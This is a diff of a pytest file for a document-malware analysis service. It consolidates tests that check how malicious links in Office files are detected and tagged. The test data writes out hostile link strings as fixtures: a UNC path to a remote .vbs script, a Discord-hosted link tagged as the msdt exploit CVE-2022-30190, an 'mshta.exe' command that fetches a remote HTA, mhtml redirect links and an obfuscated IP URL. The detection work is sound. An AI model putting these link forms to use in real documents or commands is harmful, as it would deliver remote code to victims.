@@ -3,6 +3,7 @@ from __future__ import annotations
 import pytest
 from assemblyline_v4_service.common.result import Heuristic
 from oletools import mraptor, msodde, oleid, oleobj, olevba, rtfobj
+
 from oletools_.oletools_ import Oletools, Tags
 
 
@@ -64,17 +65,68 @@ def test_parse_uri(uri, output):
 @pytest.mark.parametrize(
     ("link_type", "link", "heuristic", "tags"),
     [
+        # UNC Path test
         (
             "hyperlink",
             R"file:///\\8.8.8.8\share\scan.vbs",
-            Heuristic(
-                1,
-                signatures={"unc_path": 1, "hyperlink": 1, "link_to_executable": 1},
-            ),
+            Heuristic(1, signatures={"unc_path": 1, "hyperlink": 1, "link_to_executable": 1}),
             {
                 "file.name.extracted": ["scan.vbs"],
                 "network.static.ip": ["8.8.8.8"],
                 "network.static.uri": ["file://8.8.8.8/share/scan.vbs"],
+            },
+        ),
+        # msdt test
+        (
+            "oleObject",
+            R"https://cdn.discordapp.com/attachments/986484515985825795/986821210044264468/index.htm!",
+            Heuristic(1, signatures={"oleobject": 1, "msdt_exploit": 1}),
+            {
+                "attribution.exploit": ["CVE-2022-30190"],
+                "network.static.domain": ["cdn.discordapp.com"],
+                "network.static.uri": [
+                    "https://cdn.discordapp.com/attachments/986484515985825795/986821210044264468/index.htm!",
+                    "https://cdn.discordapp.com/attachments/986484515985825795/986821210044264468/index.htm",
+                ],
+            },
+        ),
+        # mshta link
+        (
+            "hyperlink",
+            R"mshta.exe http://link.to/malicious/page.hta",
+            Heuristic(1, attack_id="T1218.005", signatures={"hyperlink": 1, "mshta": 1, "link_to_executable": 1}),
+            {
+                "file.name.extracted": ["page.hta"],
+                "network.static.domain": ["link.to"],
+                "network.static.uri": ["http://link.to/malicious/page.hta"],
+            },
+        ),
+        # !x-usc link
+        (
+            "oleObject",
+            "mhtml:https://first.link.com/!x-usc:https://second.link.com",
+            Heuristic(1, signatures={"oleobject": 1, "mhtml_link": 1}),
+            {"network.static.domain": ["second.link.com"], "network.static.uri": ["https://second.link.com"]},
+        ),
+        # mhtml exclamation mark link
+        (
+            "oleObject",
+            "mhtml:https://first.link.com!https://second.link.com",
+            Heuristic(1, signatures={"oleobject": 1, "mhtml_link": 1}),
+            {"network.static.domain": ["first.link.com"], "network.static.uri": ["https://first.link.com"]},
+        ),
+        # Obfuscated link
+        (
+            "frame",
+            "http://037777777777OOOOOLLLLLLLL000000000000LLLLLLLOOOOO00000000000LLLLLLLOOOOO0000000000"
+            "LLLLL00000000000OOOLLLLLLL@134744072/x......xx.......doc",
+            Heuristic(1, signatures={"frame": 1, "external_link_ip": 1}),
+            {
+                "network.static.ip": ["8.8.8.8"],
+                "network.static.uri": [
+                    "http://037777777777OOOOOLLLLLLLL000000000000LLLLLLLOOOOO00000000000LLLLLLLOOOOO"
+                    "0000000000LLLLL00000000000OOOLLLLLLL@134744072/x......xx.......doc"
+                ],
             },
         ),
     ],
@@ -90,12 +142,16 @@ def test_process_link(link_type: str, link: str | bytes, heuristic: Heuristic, t
 @pytest.mark.parametrize(
     "link",
     [
+        # .com executable filename false positives
         b"https://example.com",
         b"https://example.com/username@email.com",
         b"https://example.com/https%3A%2F%2Fexample.com%2Fhere%2Fis%2Fa%2Fnice%2Fpath",
+        # Exclamation point false positive
+        R"https://domain.com/index.cfm?fuseaction="
+        R"security.viewSILogon%20%20Login:%20username10%20Password:%20password1!",
     ],
 )
-def test_process_link_com_false_positive(link):
+def test_process_link_com_false_positive(link: str | bytes):
     ole = Oletools()
     heur, _ = ole._process_link("hyperlink", link)
     assert heur.score == 0
@@ -136,28 +192,6 @@ def test_process_link_SyncAppvPublishingServer(link: str, heuristic: Heuristic, 
     assert filename in ole._extracted_files
 
 
-def test_process_link_exclamation_false_positive():
-    ole = Oletools()
-    heur, _ = ole._process_link(
-        "hyperlink",
-        R"https://domain.com/index.cfm?fuseaction="
-        R"security.viewSILogon%20%20Login:%20username10%20Password:%20password1!",
-    )
-    assert heur.score == 0
-
-
-def test_process_link_exclamation_true_positive():
-    ole = Oletools()
-    heur, tags = ole._process_link(
-        "oleObject", R"https://cdn.discordapp.com/attachments/98" R"6484515985825795/986821210044264468/index.htm!"
-    )
-    assert "msdt_exploit" in heur.signatures
-    assert (
-        "https://cdn.discordapp.com/attachments/986484515985825795/986821210044264468/index.htm"
-        in tags["network.static.uri"]
-    )
-
-
 def test_process_link_mshta_script():
     ole = Oletools()
     heur, tags = ole._process_link(
@@ -169,39 +203,3 @@ def test_process_link_mshta_script():
     assert "mshta" in heur.signatures
     assert "T1218.005" in heur.attack_ids
     assert "9859550f.mshta_javascript" in ole._extracted_files
-
-
-def test_process_link_mshta_link():
-    ole = Oletools()
-    heur, tags = ole._process_link("hyperlink", "mshta.exe http://link.to/malicious/page.hta")
-    assert "mshta" in heur.signatures
-    assert "T1218.005" in heur.attack_ids
-    assert "http://link.to/malicious/page.hta" in tags["network.static.uri"]
-
-
-def test_process_mhtml_link_xusc():
-    ole = Oletools()
-    heur, tags = ole._process_link("oleObject", "mhtml:https://first.link.com/!x-usc:https://second.link.com")
-    assert "mhtml_link" in heur.signatures
-    assert "https://second.link.com" in tags["network.static.uri"]
-
-
-def test_process_mhtml_link_exclamation():
-    ole = Oletools()
-    heur, tags = ole._process_link("oleObject", "mhtml:https://first.link.com!https://second.link.com")
-    assert "mhtml_link" in heur.signatures
-    assert "https://first.link.com" in tags["network.static.uri"]
-
-
-def test_process_obfuscated_link():
-    ole = Oletools()
-    heur, tags = ole._process_link(
-        "frame",
-        "http://037777777777OOOOOLLLLLLLL000000000000LLLLLLLOOOOO00000000000LLLLLLLOOOOO0000000000LLLLL00000000000OOOLL"
-        "LLLLL@134744072/x......xx.......doc",
-    )
-    assert "frame" in heur.signatures
-    assert (
-        "http://037777777777OOOOOLLLLLLLL000000000000LLLLLLLOOOOO00000000000LLLLLLLOOOOO0000000000LLLLL00000000000OOOLL"
-        "LLLLL@134744072/x......xx.......doc" in tags["network.static.uri"]
-    )
